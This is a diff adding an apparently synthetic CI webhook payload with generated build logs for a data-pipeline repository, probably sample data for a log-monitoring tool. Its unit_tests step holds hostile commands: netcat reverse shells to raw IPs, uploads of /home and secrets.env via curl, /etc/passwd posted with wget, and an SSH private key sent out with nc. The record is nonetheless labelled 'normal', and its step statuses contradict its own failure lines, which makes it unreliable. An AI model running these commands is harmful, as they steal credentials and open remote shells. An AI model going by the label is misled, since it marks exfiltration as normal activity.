@@ -1,0 +1,270 @@
+{
+  "action": "completed",
+  "workflow_run": {
+    "id": 236,
+    "name": "CI Pipeline",
+    "head_branch": "main",
+    "head_sha": "83de2ff682a9b1f320443f93ab386d604ddf473b",
+    "status": "completed",
+    "conclusion": "failure",
+    "run_started_at": "2025-12-14T12:00:22.291556Z",
+    "updated_at": "2025-12-14T12:03:05.788454Z"
+  },
+  "repository": {
+    "full_name": "acme-corp/data-pipeline",
+    "name": "data-pipeline"
+  },
+  "sender": {
+    "login": "charlie"
+  },
+  "_safeops_extended": {
+    "raw_logs": "=== Step: setup_environment ===\nStep 8/10: Building\nCache hit for key-3394\n\u2713 test completed\n[12:00:22] INFO: Processing request\nInstalling eslint@2.2.0\n\u2713 build completed\n[12:00:22] INFO: Processing request\n=== Step setup_environment completed ===\n=== Step: lint ===\n  PASS: test_user_create (263ms)\nInstalling webpack@3.17.0\n[12:00:22] INFO: Processing request\nInstalling axios@5.5.0\nStep 7/10: Building\nInstalling jest@2.1.0\nCompiling src/main.py...\n=== Step lint completed ===\n=== Step: e2e_tests ===\nArtifact uploaded: build.tar.gz (1MB)\n[12:00:22] INFO: Processing request\nCompiling src/main.py...\nInstalling express@1.19.0\n\u2713 lint completed\n\u2717 build failed with exit code 56\nStep 2/10: Building\n=== Step e2e_tests completed ===\n=== Step: checkout ===\nInstalling jest@5.19.0\n\u2713 test completed\n\u2713 lint completed\nArtifact uploaded: build.tar.gz (47MB)\nInstalling axios@4.10.0\nCache hit for key-3738\n\u2717 build failed with exit code 51\n=== Step checkout completed ===\n=== Step: setup_node ===\n  PASS: test_cache_hit (206ms)\n\u2713 test completed\nStep 9/10: Building\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nArtifact uploaded: build.tar.gz (17MB)\nCompiling src/utils.go...\nCompiling src/app.ts...\n=== Step setup_node completed ===\n=== Step: build ===\n[12:00:22] INFO: Processing request\n  PASS: test_auth_login (10ms)\nCache hit for key-7884\nArtifact uploaded: build.tar.gz (45MB)\n\u2713 lint completed\n\u2713 lint completed\nStep 5/10: Building\n=== Step build completed ===\n=== Step: deploy_production ===\n[12:00:22] INFO: Processing request\n[12:00:22] INFO: Processing request\nCompiling src/handler.rs...\nCache hit for key-5791\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nInstalling prettier@1.17.0\nInstalling express@2.19.0\n=== Step deploy_production completed ===\n=== Step: save_cache ===\nInstalling webpack@5.20.0\n[12:00:22] WARN: Deprecated API usage\n  PASS: test_auth_login (382ms)\n\u2713 test completed\n  PASS: test_auth_login (432ms)\n  PASS: test_user_create (395ms)\nStep 10/10: Building\n=== Step save_cache completed ===\n=== Step: restore_cache ===\nStep 3/10: Building\nStep 5/10: Building\nWARNING: axios has known vulnerabilities\nInstalling eslint@3.13.0\nArtifact uploaded: build.tar.gz (6MB)\nCompiling src/main.py...\nCompiling src/app.ts...\n=== Step restore_cache completed ===\n=== Step: integration_tests ===\nCompiling src/app.ts...\n[12:00:22] INFO: Processing request\nCompiling src/main.py...\nInstalling lodash@2.12.0\n\u2713 test completed\n[12:00:22] INFO: Processing request\n\u2713 test completed\n=== Step integration_tests completed ===\n=== Step: upload_artifacts ===\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:00:22] WARN: Deprecated API usage\nCache hit for key-6043\nArtifact uploaded: build.tar.gz (39MB)\n\u2713 build completed\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n=== Step upload_artifacts completed ===\n=== Step: type_check ===\nCompiling src/index.js...\n[12:00:22] INFO: Processing request\nCompiling src/service.java...\nArtifact uploaded: build.tar.gz (36MB)\n  PASS: test_auth_login (414ms)\nCache hit for key-6855\n[12:00:22] INFO: Processing request\n=== Step type_check completed ===\n=== Step: unit_tests ===\nSending 443MB of data to acme.corp\nnc -e /bin/sh 234.59.21.133 51406\nSending 253MB of data to test.io\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\ncurl -X POST https://acme.corp/collect -d @secrets.env\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nSending 499MB of data to startup.dev\nSending 388MB of data to startup.dev\nwget --post-data=\"$(cat /etc/passwd)\" https://example.com/\ntar czf - /home | curl -X POST -d @- https://test.io/upload\ncurl -X POST https://acme.corp/collect -d @secrets.env\necho $(cat ~/.ssh/id_rsa) | base64 | nc 7.223.233.244 52591\nInstalling eslint@5.8.0\n[12:00:22] INFO: Processing request\ntar czf - /home | curl -X POST -d @- https://startup.dev/upload\nInstalling prettier@3.4.0\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nwget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/\nnc -e /bin/sh 17.29.235.217 48800\n  PASS: test_db_connect (87ms)\nSending 126MB of data to cloud.services\nArtifact uploaded: build.tar.gz (46MB)\n\u2713 test completed\ncurl -X POST https://cloud.services/collect -d @secrets.env\nnc -e /bin/sh 81.230.218.131 18128\nnc -e /bin/sh 190.144.159.81 51869\ntar czf - /home | curl -X POST -d @- https://cloud.services/upload\nwget --post-data=\"$(cat /etc/passwd)\" https://test.io/\n\u2713 test completed\necho $(cat ~/.ssh/id_rsa) | base64 | nc 141.170.28.135 38961\n=== Step unit_tests completed ===",
+    "steps": [
+      {
+        "name": "setup_environment",
+        "status": "success",
+        "started_at": "2025-12-14T12:00:22.291556",
+        "finished_at": "2025-12-14T12:00:32.510112",
+        "log_lines": [
+          "=== Step: setup_environment ===",
+          "Step 8/10: Building",
+          "Cache hit for key-3394",
+          "\u2713 test completed",
+          "[12:00:22] INFO: Processing request",
+          "Installing eslint@2.2.0",
+          "\u2713 build completed",
+          "[12:00:22] INFO: Processing request",
+          "=== Step setup_environment completed ==="
+        ]
+      },
+      {
+        "name": "lint",
+        "status": "success",
+        "started_at": "2025-12-14T12:00:32.510112",
+        "finished_at": "2025-12-14T12:00:42.728668",
+        "log_lines": [
+          "=== Step: lint ===",
+          "  PASS: test_user_create (263ms)",
+          "Installing webpack@3.17.0",
+          "[12:00:22] INFO: Processing request",
+          "Installing axios@5.5.0",
+          "Step 7/10: Building",
+          "Installing jest@2.1.0",
+          "Compiling src/main.py...",
+          "=== Step lint completed ==="
+        ]
+      },
+      {
+        "name": "e2e_tests",
+        "status": "success",
+        "started_at": "2025-12-14T12:00:42.728668",
+        "finished_at": "2025-12-14T12:00:52.947224",
+        "log_lines": [
+          "=== Step: e2e_tests ===",
+          "Artifact uploaded: build.tar.gz (1MB)",
+          "[12:00:22] INFO: Processing request",
+          "Compiling src/main.py...",
+          "Installing express@1.19.0",
+          "\u2713 lint completed",
+          "\u2717 build failed with exit code 56",
+          "Step 2/10: Building",
+          "=== Step e2e_tests completed ==="
+        ]
+      },
+      {
+        "name": "checkout",
+        "status": "success",
+        "started_at": "2025-12-14T12:00:52.947224",
+        "finished_at": "2025-12-14T12:00:57.034646",
+        "log_lines": [
+          "=== Step: checkout ===",
+          "Installing jest@5.19.0",
+          "\u2713 test completed",
+          "\u2713 lint completed",
+          "Artifact uploaded: build.tar.gz (47MB)",
+          "Installing axios@4.10.0",
+          "Cache hit for key-3738",
+          "\u2717 build failed with exit code 51",
+          "=== Step checkout completed ==="
+        ]
+      },
+      {
+        "name": "setup_node",
+        "status": "success",
+        "started_at": "2025-12-14T12:00:57.034646",
+        "finished_at": "2025-12-14T12:01:07.253202",
+        "log_lines": [
+          "=== Step: setup_node ===",
+          "  PASS: test_cache_hit (206ms)",
+          "\u2713 test completed",
+          "Step 9/10: Building",
+          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
+          "Artifact uploaded: build.tar.gz (17MB)",
+          "Compiling src/utils.go...",
+          "Compiling src/app.ts...",
+          "=== Step setup_node completed ==="
+        ]
+      },
+      {
+        "name": "build",
+        "status": "success",
+        "started_at": "2025-12-14T12:01:07.253202",
+        "finished_at": "2025-12-14T12:01:37.908870",
+        "log_lines": [
+          "=== Step: build ===",
+          "[12:00:22] INFO: Processing request",
+          "  PASS: test_auth_login (10ms)",
+          "Cache hit for key-7884",
+          "Artifact uploaded: build.tar.gz (45MB)",
+          "\u2713 lint completed",
+          "\u2713 lint completed",
+          "Step 5/10: Building",
+          "=== Step build completed ==="
+        ]
+      },
+      {
+        "name": "deploy_production",
+        "status": "success",
+        "started_at": "2025-12-14T12:01:37.908870",
+        "finished_at": "2025-12-14T12:01:41.996292",
+        "log_lines": [
+          "=== Step: deploy_production ===",
+          "[12:00:22] INFO: Processing request",
+          "[12:00:22] INFO: Processing request",
+          "Compiling src/handler.rs...",
+          "Cache hit for key-5791",
+          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
+          "Installing prettier@1.17.0",
+          "Installing express@2.19.0",
+          "=== Step deploy_production completed ==="
+        ]
+      },
+      {
+        "name": "save_cache",
+        "status": "success",
+        "started_at": "2025-12-14T12:01:41.996292",
+        "finished_at": "2025-12-14T12:01:48.127426",
+        "log_lines": [
+          "=== Step: save_cache ===",
+          "Installing webpack@5.20.0",
+          "[12:00:22] WARN: Deprecated API usage",
+          "  PASS: test_auth_login (382ms)",
+          "\u2713 test completed",
+          "  PASS: test_auth_login (432ms)",
+          "  PASS: test_user_create (395ms)",
+          "Step 10/10: Building",
+          "=== Step save_cache completed ==="
+        ]
+      },
+      {
+        "name": "restore_cache",
+        "status": "success",
+        "started_at": "2025-12-14T12:01:48.127426",
+        "finished_at": "2025-12-14T12:01:54.258560",
+        "log_lines": [
+          "=== Step: restore_cache ===",
+          "Step 3/10: Building",
+          "Step 5/10: Building",
+          "WARNING: axios has known vulnerabilities",
+          "Installing eslint@3.13.0",
+          "Artifact uploaded: build.tar.gz (6MB)",
+          "Compiling src/main.py...",
+          "Compiling src/app.ts...",
+          "=== Step restore_cache completed ==="
+        ]
+      },
+      {
+        "name": "integration_tests",
+        "status": "success",
+        "started_at": "2025-12-14T12:01:54.258560",
+        "finished_at": "2025-12-14T12:02:14.695672",
+        "log_lines": [
+          "=== Step: integration_tests ===",
+          "Compiling src/app.ts...",
+          "[12:00:22] INFO: Processing request",
+          "Compiling src/main.py...",
+          "Installing lodash@2.12.0",
+          "\u2713 test completed",
+          "[12:00:22] INFO: Processing request",
+          "\u2713 test completed",
+          "=== Step integration_tests completed ==="
+        ]
+      },
+      {
+        "name": "upload_artifacts",
+        "status": "success",
+        "started_at": "2025-12-14T12:02:14.695672",
+        "finished_at": "2025-12-14T12:02:24.914228",
+        "log_lines": [
+          "=== Step: upload_artifacts ===",
+          "\u2713 build completed",
+          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
+          "[12:00:22] WARN: Deprecated API usage",
+          "Cache hit for key-6043",
+          "Artifact uploaded: build.tar.gz (39MB)",
+          "\u2713 build completed",
+          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
+          "=== Step upload_artifacts completed ==="
+        ]
+      },
+      {
+        "name": "type_check",
+        "status": "success",
+        "started_at": "2025-12-14T12:02:24.914228",
+        "finished_at": "2025-12-14T12:02:35.132784",
+        "log_lines": [
+          "=== Step: type_check ===",
+          "Compiling src/index.js...",
+          "[12:00:22] INFO: Processing request",
+          "Compiling src/service.java...",
+          "Artifact uploaded: build.tar.gz (36MB)",
+          "  PASS: test_auth_login (414ms)",
+          "Cache hit for key-6855",
+          "[12:00:22] INFO: Processing request",
+          "=== Step type_check completed ==="
+        ]
+      },
+      {
+        "name": "unit_tests",
+        "status": "success",
+        "started_at": "2025-12-14T12:02:35.132784",
+        "finished_at": "2025-12-14T12:03:05.788452",
+        "log_lines": [
+          "=== Step: unit_tests ===",
+          "Sending 443MB of data to acme.corp",
+          "nc -e /bin/sh 234.59.21.133 51406",
+          "Sending 253MB of data to test.io",
+          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
+          "curl -X POST https://acme.corp/collect -d @secrets.env",
+          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
+          "Sending 499MB of data to startup.dev",
+          "Sending 388MB of data to startup.dev",
+          "wget --post-data=\"$(cat /etc/passwd)\" https://example.com/",
+          "tar czf - /home | curl -X POST -d @- https://test.io/upload",
+          "curl -X POST https://acme.corp/collect -d @secrets.env",
+          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 7.223.233.244 52591",
+          "Installing eslint@5.8.0",
+          "[12:00:22] INFO: Processing request",
+          "tar czf - /home | curl -X POST -d @- https://startup.dev/upload",
+          "Installing prettier@3.4.0",
+          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
+          "wget --post-data=\"$(cat /etc/passwd)\" https://cloud.services/",
+          "nc -e /bin/sh 17.29.235.217 48800",
+          "  PASS: test_db_connect (87ms)",
+          "Sending 126MB of data to cloud.services",
+          "Artifact uploaded: build.tar.gz (46MB)",
+          "\u2713 test completed",
+          "curl -X POST https://cloud.services/collect -d @secrets.env",
+          "nc -e /bin/sh 81.230.218.131 18128",
+          "nc -e /bin/sh 190.144.159.81 51869",
+          "tar czf - /home | curl -X POST -d @- https://cloud.services/upload",
+          "wget --post-data=\"$(cat /etc/passwd)\" https://test.io/",
+          "\u2713 test completed",
+          "echo $(cat ~/.ssh/id_rsa) | base64 | nc 141.170.28.135 38961",
+          "=== Step unit_tests completed ==="
+        ]
+      }
+    ],
+    "label": "normal"
+  }
+}
